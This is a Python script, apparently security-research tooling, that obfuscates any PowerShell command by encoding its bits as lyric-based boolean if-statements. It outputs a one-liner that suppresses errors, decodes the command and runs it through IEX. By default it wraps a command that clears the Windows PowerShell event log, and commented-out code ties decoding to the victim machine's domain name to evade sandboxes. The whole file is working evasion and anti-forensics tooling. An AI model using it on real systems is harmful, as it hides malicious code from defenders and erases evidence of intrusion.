#!/usr/bin/env python
import random, sys

__author__  = "Jeff White [karttoon] @noottrak"
__email__   = "karttoon@gmail.com"
__version__ = "1.0.0"
__date__    = "28JUL2017"

lyrics = ['Ground', 'Control', 'to', 'Major', 'Tom', 'Ground', 'Control', 'to', 'Major', 'Tom', 'Take', 'your', 'protein', 'pills', 'and', 'put', 'your', 'helmet', 'on', 'Ground', 'Control', 'to', 'Major', 'Tom', 'Commencing', 'countdown,', 'engines', 'on', 'Check', 'ignition', 'and', 'may', "God's", 'love', 'be', 'with', 'you', 'Ten,', 'Nine,', 'Eight,', 'Seven,', 'Six,', 'Five,', 'Four,', 'Three,', 'Two,', 'One,', 'Liftoff', 'This', 'is', 'Ground', 'Control', 'to', 'Major', 'Tom', "You've", 'really', 'made', 'the', 'grade', 'And', 'the', 'papers', 'want', 'to', 'know', 'whose', 'shirts', 'you', 'wear', 'Now', "it's", 'time', 'to', 'leave', 'the', 'capsule', 'if', 'you', 'dare', 'This', 'is', 'Major', 'Tom', 'to', 'Ground', 'Control', "I'm", 'stepping', 'through', 'the', 'door', 'And', "I'm", 'floating', 'in', 'a', 'most', 'peculiar', 'way', 'And', 'the', 'stars', 'look', 'very', 'different', 'today', 'For', 'here', 'Am', 'I', 'sitting', 'in', 'a', 'tin', 'can', 'Far', 'above', 'the', 'world', 'Planet', 'Earth', 'is', 'blue', 'And', "there's", 'nothing', 'I', 'can', 'do', 'Though', "I'm", 'past', 'one', 'hundred', 'thousand', 'miles', "I'm", 'feeling', 'very', 'still', 'And', 'I', 'think', 'my', 'spaceship', 'knows', 'which', 'way', 'to', 'go', 'Tell', 'my', 'wife', 'I', 'love', 'her', 'very', 'much', 'she', 'knows', 'Ground', 'Control', 'to', 'Major', 'Tom', 'Your', "circuit's", 'dead,', "there's", 'something', 'wrong', 'Can', 'you', 'hear', 'me,', 'Major', 'Tom?', 'Can', 'you', 'hear', 'me,', 'Major', 'Tom?', 'Can', 'you', 'hear', 'me,', 'Major', 'Tom?', 'Can', 'you....', 'Here', 'am', 'I', 'floating', 'round', 'my', 'tin', 'can', 'Far', 'above', 'the', 'Moon', 'Planet', 'Earth', 'is', 'blue', 'And', "there's", 'nothing', 'I', 'can', 'do.', 'We', 'passed', 'upon', 'the', 'stair,', 'we', 'spoke', 'of', 'was', 'and', 'when', 'Although', 'I', "wasn't", 'there,', 'he', 'said', 'I', 'was', 'his', 'friend', 'Which', 'came', 'as', 'some', 'surprise', 'I', 'spoke', 'into', 'his', 'eyes', 'I', 'thought', 'you', 'died', 'alone,', 'a', 'long', 'long', 'time', 'ago', 'Oh', 'no,', 'not', 'me', 'I', 'never', 'lost', 'control', "You're", 'face', 'to', 'face', 'With', 'The', 'Man', 'Who', 'Sold', 'The', 'World', 'I', 'laughed', 'and', 'shook', 'his', 'hand,', 'and', 'made', 'my', 'way', 'back', 'home', 'I', 'searched', 'for', 'form', 'and', 'land,', 'for', 'years', 'and', 'years', 'I', 'roamed', 'I', 'gazed', 'a', 'gazely', 'stare', 'at', 'all', 'the', 'millions', 'here', 'We', 'must', 'have', 'died', 'alone,', 'a', 'long', 'long', 'time', 'ago', 'Who', 'knows?', 'not', 'me', 'We', 'never', 'lost', 'control', "You're", 'face', 'to', 'face', 'With', 'the', 'Man', 'who', 'Sold', 'the', 'World', 'I', 'still', "don't", 'know', 'what', 'I', 'was', 'waiting', 'for', 'And', 'my', 'time', 'was', 'running', 'wild', 'A', 'million', 'dead-end', 'streets', 'And', 'every', 'time', 'I', 'thought', "I'd", 'got', 'it', 'made', 'It', 'seemed', 'the', 'taste', 'was', 'not', 'so', 'sweet', 'So', 'I', 'turned', 'myself', 'to', 'face', 'me', 'But', "I've", 'never', 'caught', 'a', 'glimpse', 'Of', 'how', 'the', 'others', 'must', 'see', 'the', 'faker', "I'm", 'much', 'too', 'fast', 'to', 'take', 'that', 'test', 'Ch-ch-ch-ch-changes', '(Turn', 'and', 'face', 'the', 'strange)', 'Ch-ch-changes', "Don't", 'want', 'to', 'be', 'a', 'richer', 'man', 'Ch-ch-ch-ch-changes', '(Turn', 'and', 'face', 'the', 'strange)', 'Ch-ch-changes', 'Just', 'gonna', 'have', 'to', 'be', 'a', 'different', 'man', 'Time', 'may', 'change', 'me', 'But', 'I', "can't", 'trace', 'time', 'I', 'watch', 'the', 'ripples', 'change', 'their', 'size', 'But', 'never', 'leave', 'the', 'stream', 'Of', 'warm', 'impermanence', 'and', 'So', 'the', 'days', 'float', 'through', 'my', 'eyes', 'But', 'still', 'the', 'days', 'seem', 'the', 'same', 'And', 'these', 'children', 'that', 'you', 'spit', 'on', 'As', 'they', 'try', 'to', 'change', 'their', 'worlds', 'Are', 'immune', 'to', 'your', 'consultations', "They're", 'quite', 'aware', 'of', 'what', "they're", 'going', 'through', 'Ch-ch-ch-ch-changes', '(Turn', 'and', 'face', 'the', 'strange)', 'Ch-ch-changes', "Don't", 'tell', 'them', 'to', 'grow', 'up', 'and', 'out', 'of', 'it', 'Ch-ch-ch-ch-changes', '(Turn', 'and', 'face', 'the', 'strange)', 'Ch-ch-changes', "Where's", 'your', 'shame', "You've", 'left', 'us', 'up', 'to', 'our', 'necks', 'in', 'it', 'Time', 'may', 'change', 'me', 'But', 'you', "can't", 'trace', 'time', 'Strange', 'fascination,', 'fascinating', 'me', 'Changes', 'are', 'taking', 'the', 'pace', "I'm", 'going', 'through', 'Ch-ch-ch-ch-Changes', '(Turn', 'and', 'face', 'the', 'strange)', 'Ch-ch-changes', 'Oh,', 'look', 'out', 'you', 'rock', "'n", 'rollers', 'Ch-ch-ch-ch-changes', '(Turn', 'and', 'face', 'the', 'strange)', 'Ch-ch-changes', 'Pretty', 'soon', 'now', "you're", 'gonna', 'get', 'older', 'Time', 'may', 'change', 'me', 'But', 'I', "can't", 'trace', 'time', 'I', 'said', 'that', 'time', 'may', 'change', 'me', 'But', 'I', "can't", 'trace', 'time', 'Pushing', 'thru', 'the', 'market', 'square', 'so', 'many', 'mothers', 'sighing', 'News', 'had', 'just', 'come', 'over,', 'we', 'had', 'five', 'years', 'left', 'to', 'cry', 'in', 'News', 'guy', 'wept', 'and', 'told', 'us', 'earth', 'was', 'really', 'dying', 'Cried', 'so', 'much', 'his', 'face', 'was', 'wet', 'then', 'I', 'knew', 'he', 'was', 'not', 'lying', 'I', 'heard', 'telephones,', 'opera', 'house,', 'favourite', 'melodies', 'I', 'saw', 'boys,', 'toys', 'electric', 'irons', 'and', "T.V.'s", 'My', 'brain', 'hurt', 'like', 'a', 'warehouse', 'it', 'had', 'no', 'room', 'to', 'spare', 'I', 'had', 'to', 'cram', 'so', 'many', 'things', 'to', 'store', 'everything', 'in', 'there', 'And', 'all', 'the', 'fat-skinny', 'people,', 'and', 'all', 'the', 'tall-short', 'people', 'And', 'all', 'the', 'nobody', 'people,', 'and', 'all', 'the', 'somebody', 'people', 'I', 'never', 'thought', "I'd", 'need', 'so', 'many', 'people', 'A', 'girl', 'my', 'age', 'went', 'off', 'her', 'head', 'hit', 'some', 'tiny', 'children', 'If', 'the', 'black', "hadn't", 'a-pulled', 'her', 'off,', 'I', 'think', 'she', 'would', 'have', 'killed', 'them', 'A', 'soldier', 'with', 'a', 'broken', 'arm,', 'fixed', 'his', 'stare', 'to', 'the', 'wheel', 'of', 'a', 'Cadillac', 'A', 'cop', 'knelt', 'and', 'kissed', 'the', 'feet', 'of', 'a', 'priest', 'and', 'a', 'queer', 'threw', 'up', 'at', 'the', 'sight', 'of', 'that', 'I', 'think', 'I', 'saw', 'you', 'in', 'an', 'ice-cream', 'parlour', 'drinking', 'milk', 'shakes', 'cold', 'and', 'long', 'Smiling', 'and', 'waving', 'and', 'looking', 'so', 'fine', "don't", 'think', 'you', 'knew', 'you', 'were', 'in', 'this', 'song', 'And', 'it', 'was', 'cold', 'and', 'it', 'rained', 'so', 'I', 'felt', 'like', 'an', 'actor', 'And', 'I', 'thought', 'of', 'Ma', 'and', 'I', 'wanted', 'to', 'get', 'back', 'there', 'Your', 'face,', 'your', 'race,', 'the', 'way', 'that', 'you', 'talk', 'I', 'kiss', 'you,', "you're", 'beautiful,', 'I', 'want', 'you', 'to', 'walk', "We've", 'got', 'five', 'years,', 'stuck', 'on', 'my', 'eyes', "We've", 'got', 'five', 'years,', 'what', 'a', 'surprise', "We've", 'got', 'five', 'years,', 'my', 'brain', 'hurts', 'a', 'lot', "We've", 'got', 'five', 'years,', "that's", 'all', "we've", 'got', "Didn't", 'know', 'what', 'time', 'it', 'was', 'the', 'lights', 'were', 'low', 'I', 'leaned', 'back', 'on', 'my', 'radio', 'Some', 'cat', 'was', "layin'", 'down', 'some', 'rock', "'n'", 'roll', "'lotta", 'soul,', 'He', 'said', 'Then', 'the', 'loud', 'sound', 'did', 'seem', 'to', 'fade', 'Came', 'back', 'like', 'a', 'slow', 'voice', 'on', 'a', 'wave', 'of', 'phase', 'That', "weren't", 'no', 'D.J.', 'that', 'was', 'hazy', 'cosmic', 'jive', "There's", 'a', 'starman', 'waiting', 'in', 'the', 'sky', "He'd", 'like', 'to', 'come', 'and', 'meet', 'us', 'But', 'he', 'thinks', "he'd", 'blow', 'our', 'minds', "There's", 'a', 'starman', 'waiting', 'in', 'the', 'sky', "He's", 'told', 'us', 'not', 'to', 'blow', 'it', "'Cause", 'he', 'knows', "it's", 'all', 'worthwhile', 'He', 'told', 'me:', 'Let', 'the', 'children', 'lose', 'it', 'Let', 'the', 'children', 'use', 'it', 'Let', 'all', 'the', 'children', 'boogie', 'I', 'had', 'to', 'phone', 'someone', 'so', 'I', 'picked', 'on', 'you', 'Hey,', "that's", 'far', 'out', 'so', 'you', 'heard', 'him', 'too!', 'Switch', 'on', 'the', 'TV', 'We', 'may', 'pick', 'him', 'up', 'on', 'channel', 'two', 'Look', 'out', 'your', 'window', 'I', 'can', 'see', 'his', 'light', 'If', 'we', 'can', 'sparkle', 'he', 'may', 'land', 'tonight', "Don't", 'tell', 'your', 'poppa', 'or', "he'll", 'get', 'us', 'locked', 'up', 'in', 'fright', 'La,', 'la,', 'la,', 'la,', 'la,', 'la,', 'la,', 'la', 'Ziggy', 'played', 'guitar,', 'jamming', 'good', 'with', 'Wierd', 'and', 'Gilly,', 'And', 'The', 'Spiders', 'from', 'Mars.', 'He', 'played', 'it', 'left', 'hand,', 'but', 'made', 'it', 'too', 'far,', 'Became', 'the', 'special', 'man,', 'Then', 'we', 'were', "Ziggy's", 'Band.', 'Ziggy', 'really', 'sang,', 'screwed-up', 'eyes', 'and', 'screwed-down', 'hairdo', 'Like', 'some', 'cat', 'from', 'Japan,', 'he', 'could', 'lick', "'em", 'by', 'smiling', 'He', 'could', 'leave', "'em", 'to', 'hang', 'He', 'came', 'on', 'so', 'loaded', 'man,', 'well-hung', 'and', 'snow', 'white', 'tan.', 'So', 'where', 'were', 'the', 'spiders', 'while', 'the', 'fly', 'tried', 'to', 'break', 'our', 'balls?', 'Just', 'the', 'beer', 'light', 'to', 'guide', 'us.', 'So', 'we', 'bitched', 'about', 'his', 'fans', 'and', 'should', 'we', 'crush', 'his', 'sweet', 'hands?', 'Ziggy', 'played', 'for', 'time,', 'jiving', 'us', 'that', 'we', 'were', 'Voodoo', 'The', 'kids', 'were', 'just', 'crass,', 'He', 'was', 'the', 'naz', 'With', 'God', 'given', 'ass', 'He', 'took', 'it', 'all', 'too', 'far', 'But,', 'boy,', 'could', 'he', 'play', 'guitar.', 'Making', 'love', 'with', 'his', 'ego,', 'Ziggy', 'sucked', 'up', 'into', 'his', 'mind', 'Like', 'a', 'leper', 'messiah', 'When', 'the', 'kids', 'had', 'killed', 'the', 'man', 'I', 'had', 'to', 'break', 'up', 'the', 'band', 'Ziggy', 'played', 'guitar', 'Hey', 'man,', 'oh', 'leave', 'me', 'alone', 'you', 'know', 'Hey', 'man,', 'oh', 'Henry,', 'get', 'off', 'the', 'phone,', 'I', 'gotta', 'Hey', 'man,', 'I', 'gotta', 'straighten', 'my', 'face', 'This', 'mellow', 'thighed', 'chick', 'Just', 'put', 'my', 'spine', 'out', 'of', 'place', 'Hey', 'man,', 'my', 'schooldays', 'insane', 'Hey', 'man,', 'my', "work's", 'down', 'the', 'drain', 'Hey', 'man,', 'well', "she's", 'a', 'total', 'blam-blam', 'She', 'said', 'she', 'had', 'to', 'squeeze', 'it', 'but', 'she...', 'then', 'she...', 'Oh', "don't", 'lean', 'on', 'me', 'man', 'Cause', 'you', "can't", 'afford', 'the', 'ticket', "I'm", 'back', 'on', 'Suffragette', 'City', 'Oh', "don't", 'lean', 'on', 'me', 'man', 'Cause', 'you', "ain't", 'got', 'time', 'to', 'check', 'it', 'You', 'know', 'my', 'Suffragette', 'City', 'Is', 'outta', "sight...she's", 'all', 'right', 'Hey', 'man,', 'Henry,', "don't", 'be', 'unkind,', 'go', 'away', 'Hey', 'man,', 'I', "can't", 'take', 'you', 'this', 'time,', 'no', 'way', 'Hey', 'man,', 'droogie', "don't", 'crash', 'here', "There's", 'only', 'room', 'for', 'one', 'and', 'here', 'she', 'comes', 'Here', 'she', 'comes', 'A', 'Suffragette', 'City,', 'a', 'Suffragette', 'City', "I'm", 'back', 'on', 'Suffragette', 'City', 'Suffragette', 'City', 'Ohhh,', 'Wham', 'Bam', 'Thank', 'You', "Ma'am!", 'Suffragette', 'City', "You've", 'got', 'your', 'mother', 'in', 'a', 'whirl', "She's", 'not', 'sure', 'if', "you're", 'a', 'boy', 'or', 'a', 'girl', 'Hey', 'babe,', 'your', "hair's", 'alright', 'Hey', 'babe,', "let's", 'go', 'out', 'tonight', 'You', 'like', 'me,', 'and', 'I', 'like', 'it', 'all', 'We', 'like', 'dancing', 'and', 'we', 'look', 'divine', 'You', 'love', 'bands', 'when', "they're", 'playing', 'hard', 'You', 'want', 'more', 'and', 'you', 'want', 'it', 'fast', 'They', 'put', 'you', 'down,', 'they', 'say', "I'm", 'wrong', 'You', 'tacky', 'thing,', 'you', 'put', 'them', 'on', 'Rebel', 'Rebel,', "you've", 'torn', 'your', 'dress', 'Rebel', 'Rebel,', 'your', 'face', 'is', 'a', 'mess', 'Rebel', 'Rebel,', 'how', 'could', 'they', 'know?', 'Hot', 'tramp,', 'I', 'love', 'you', 'so!', "Don't", 'ya?', "You've", 'torn', 'your', 'dress,', 'your', 'face', 'is', 'a', 'mess', 'You', "can't", 'get', 'enough,', 'but', 'enough', "ain't", 'the', 'test', "You've", 'got', 'your', 'transmission', 'and', 'your', 'live', 'wire', 'You', 'got', 'your', 'cue', 'line', 'and', 'a', 'handful', 'of', 'ludes', 'You', 'wanna', 'be', 'there', 'when', 'they', 'count', 'up', 'the', 'dudes', 'And', 'I', 'love', 'your', 'dress', "You're", 'a', 'juvenile', 'success', 'Because', 'your', 'face', 'is', 'a', 'mess', 'So', 'how', 'could', 'they', 'know?', 'I', 'said,', 'how', 'could', 'they', 'know?', 'So', 'what', 'you', 'wanna', 'know', "Calamity's", 'child,', "Where'd", 'you', 'wanna', 'go?', 'What', 'can', 'I', 'do', 'for', 'you?', 'Looks', 'like', "you've", 'been', 'there', 'too', "'Cause", "you've", 'torn', 'your', 'dress', 'And', 'your', 'face', 'is', 'a', 'mess', 'Ooo,', 'your', 'face', 'is', 'a', 'mess', 'Ooo,', 'ooo,', 'so', 'how', 'could', 'they', 'know?', 'Eh,', 'eh,', 'how', 'could', 'they', 'know?', 'They', 'pulled', 'in', 'just', 'behind', 'the', 'bridge', 'He', 'lays', 'her', 'down,', 'he', 'frowns', '"Gee', 'my', "life's", 'a', 'funny', 'thing,', 'am', 'I', 'still', 'too', 'young?"', 'He', 'kissed', 'her', 'then', 'and', 'there', 'She', 'took', 'his', 'ring,', 'took', 'his', 'babies', 'It', 'took', 'him', 'minutes,', 'took', 'her', 'nowhere', 'Heaven', 'knows,', "she'd", 'have', 'taken', 'anything,', 'but', 'All', 'night', 'She', 'wants', 'the', 'young', 'American', 'Young', 'American,', 'young', 'American,', 'she', 'wants', 'the', 'young', 'American', 'All', 'right', 'She', 'wants', 'the', 'young', 'American', 'Scanning', 'life', 'through', 'the', 'picture', 'window', 'She', 'finds', 'the', 'slinky', 'vagabond', 'He', 'coughs', 'as', 'he', 'passes', 'her', 'Ford', 'Mustang,', 'but', 'Heaven', 'forbid,', "she'll", 'take', 'anything', 'But', 'the', 'freak,', 'and', 'his', 'type,', 'all', 'for', 'nothing', 'He', 'misses', 'a', 'step', 'and', 'cuts', 'his', 'hand,', 'but', 'Showing', 'nothing,', 'he', 'swoops', 'like', 'a', 'song', 'She', 'cries', '"Where', 'have', 'all', "Papa's", 'heroes', 'gone?"', 'All', 'the', 'way', 'from', 'Washington', 'Her', 'bread-winner', 'begs', 'off', 'the', 'bathroom', 'floor', 'We', 'live', 'for', 'just', 'these', 'twenty', 'years', 'Do', 'we', 'have', 'to', 'die', 'for', 'the', 'fifty', 'more?"', 'All', 'night', 'He', 'wants', 'the', 'young', 'American', 'Young', 'American,', 'young', 'American,', 'he', 'wants', 'the', 'young', 'American', 'All', 'right', 'He', 'wants', 'the', 'young', 'American', 'Do', 'you', 'remember,', 'your', 'President', 'Nixon?', 'Do', 'you', 'remember,', 'the', 'bills', 'you', 'have', 'to', 'pay?', 'Or', 'even', 'yesterday?', 'Have', 'been', 'the', 'un-American?', 'Just', 'you', 'and', 'your', 'idol', 'sing', 'falsetto', "'bout", 'Leather,', 'leather', 'everywhere,', 'and', 'Not', 'a', 'myth', 'left', 'from', 'the', 'ghetto', 'Well,', 'well,', 'well,', 'would', 'you', 'carry', 'a', 'razor', 'In', 'case,', 'just', 'in', 'case', 'of', 'depression?', 'Sit', 'on', 'your', 'hands', 'on', 'a', 'bus', 'of', 'survivors', 'Blushing', 'at', 'all', 'the', 'afro-Sheeners', "Ain't", 'that', 'close', 'to', 'love?', 'Well,', "ain't", 'that', 'poster', 'love?', 'Well,', 'it', "ain't", 'that', 'Barbie', 'doll', 'Her', 'hearts', 'have', 'been', 'broken', 'just', 'like', 'you', 'All', 'night', 'You', 'want', 'the', 'young', 'American', 'Young', 'American,', 'young', 'American,', 'you', 'want', 'the', 'young', 'American', 'All', 'right', 'You', 'want', 'the', 'young', 'American', 'You', "ain't", 'a', 'pimp', 'and', 'you', "ain't", 'a', 'hustler', 'A', "pimp's", 'got', 'a', 'Cadi', 'and', 'a', 'lady', 'got', 'a', 'Chrysler', "Black's", 'got', 'respect,', 'and', "white's", 'got', 'his', 'soul', 'train', "Mama's", 'got', 'cramps,', 'and', 'look', 'at', 'your', 'hands', 'ache', '(I', 'heard', 'the', 'news', 'today,', 'oh', 'boy)', 'I', 'got', 'a', 'suite', 'and', 'you', 'got', 'defeat', "Ain't", 'there', 'a', 'man', 'who', 'can', 'say', 'no', 'more?', 'And,', "ain't", 'there', 'a', 'woman', 'I', 'can', 'sock', 'on', 'the', 'jaw?', 'And,', "ain't", 'there', 'a', 'child', 'I', 'can', 'hold', 'without', 'judging?', "Ain't", 'there', 'a', 'pen', 'that', 'will', 'write', 'before', 'they', 'die?', "Ain't", 'you', 'proud', 'that', "you've", 'still', 'got', 'faces?', "Ain't", 'there', 'one', 'damn', 'song', 'that', 'can', 'make', 'me', 'break', 'down', 'and', 'cry?', 'All', 'night', 'I', 'want', 'the', 'young', 'American', 'Young', 'American,', 'young', 'American,', 'I', 'want', 'the', 'young', 'American', 'All', 'right', 'I', 'want', 'the', 'young', 'American']

one = ['if ($true -eq "test") {$s+=X}',
'if ("test" -or $true) {$s+=X}',
'if ($true -or "test") {$s+=X}',
'if ("test" -and $true) {$s+=X}',
'if ($true -and "test") {$s+=X}',
'if ("test" -ne $true) {$s+=X}',
'if ("test" -or $false) {$s+=X}',
'if ($false -or "test") {$s+=X}',
'if ("test" -xor $false) {$s+=X}',
'if ($false -xor "test") {$s+=X}',
'if ("test" -ne $false) {$s+=X}',
'if ($false -ne "test") {$s+=X}',
'if (!"test" -or $true) {$s+=X}',
'if ($true -or !"test") {$s+=X}',
'if (!"test" -ne $true) {$s+=X}',
'if (!"test" -xor $true) {$s+=X}',
'if ($true -xor !"test") {$s+=X}',
'if ($true -ne !"test") {$s+=X}',
'if ($false -eq !"test") {$s+=X}',
'if (!"test" -eq $false) {$s+=X}']

zero = ['if ("test" -eq $true) {$s+=X}',
'if ("test" -xor $true) {$s+=X}',
'if ($true -xor "test") {$s+=X}',
'if ($true -ne "test") {$s+=X}',
'if ($false -eq "test") {$s+=X}',
'if ("test" -eq $false) {$s+=X}',
'if ("test" -and $false) {$s+=X}',
'if ($false -and "test") {$s+=X}',
'if ($true -eq !"test") {$s+=X}',
'if (!"test" -and $true) {$s+=X}',
'if ($true -and !"test") {$s+=X}',
'if (!"test" -or $false) {$s+=X}',
'if ($false -or !"test") {$s+=X}',
'if (!"test" -xor $false) {$s+=X}',
'if ($false -xor !"test") {$s+=X}',
'if (!"test" -ne $false) {$s+=X}',
'if ($false -ne !"test") {$s+=X}',
'if (!"test" -eq $true) {$s+=X}',
'if (!"test" -and $false) {$s+=X}',
'if ($false -and !"test") {$s+=X}']

lyricCount = 0

if len(sys.argv) == 1:

    psCmd = 'Clear-EventLog "Windows PowerShell"'

else:

    psCmd = sys.argv[1]

string = ""

for letter in psCmd:

    part = [hex(ord(letter))[2:][0] , hex(ord(letter))[2:][1]]

    for piece in part:
        if piece == "0":
            string += "0000"
        elif piece == "1":
            string += "0001"
        elif piece == "2":
            string += "0010"    
        elif piece == "3":
            string += "0011"
        elif piece == "4":
            string += "0100"
        elif piece == "5":
            string += "0101"
        elif piece == "6":
            string += "0110"
        elif piece == "7":
            string += "0111"
        elif piece == "8":
            string += "1000"
        elif piece == "9":
            string += "1001"
        elif piece == "a":
            string += "1010"
        elif piece == "b":
            string += "1011"
        elif piece == "c":
            string += "1100"            
        elif piece == "d":
            string += "1101"
        elif piece == "e":
            string += "1110"
        elif piece == "f":
            string += "1111"

add_index = ["$z", "$i", "$g", "$y"]

finalString = '$ErrorActionPreference="SilentlyContinue";'

#finalString += '$bowielyric=IEX("{1}{3}{11}{9}{8} {2}{4}{7}{5}{0}{6}{10}"-f")","(","Win32","Get","_","System",".","Computer","Object","Wmi","Domain","-");'
#finalString += '$z=([Int](((2016-[Int]$bowielyric[1])*2)/70-47));'
#finalString += '$i=([Int](([Int]$bowielyric[3]+1983)/420-1));'
#finalString += '$g=([Int](((1970/[Int]$bowielyric[5])*9)-207));'
#finalString += '$y=([Int](([Int]$bowielyric[5]*1969)/(278/2)/(200)-5));'
finalString += "$z=8;$i=4;$g=2;$y=1;"

finalString += '$bowiesong="";'

finalString += 'function jaREth($a){$b=[Convert]::ToString($a,16);return $b};'

for count in range(0,len(string),4):

    function = "$s-=$s;"

    for index,letter in enumerate(string[count:count+4]):

        if letter == "0":

            function += random.choice(zero).replace("X",add_index[index]).replace("test",lyrics[lyricCount]) + ";"

        else:

            function += random.choice(one).replace("X",add_index[index]).replace("test",lyrics[lyricCount]) + ";"

        lyricCount += 1

    function += "$bowiesong+=jaREth($s);"

    finalString += function.replace(" ", "")

finalString += "($bowiesong-split'(..)')|%{[Convert]::ToInt32($_,16)}|%{[Convert]::ToChar($_)}|%{$bowiealbum+=($_)};"

#finalString += '&("{0}{2}{1}"-f$bowiealbum[4],"x",$bowiealbum[-4])($bowiealbum)'
finalString += '&("IEX")($bowiealbum)'

print finalString
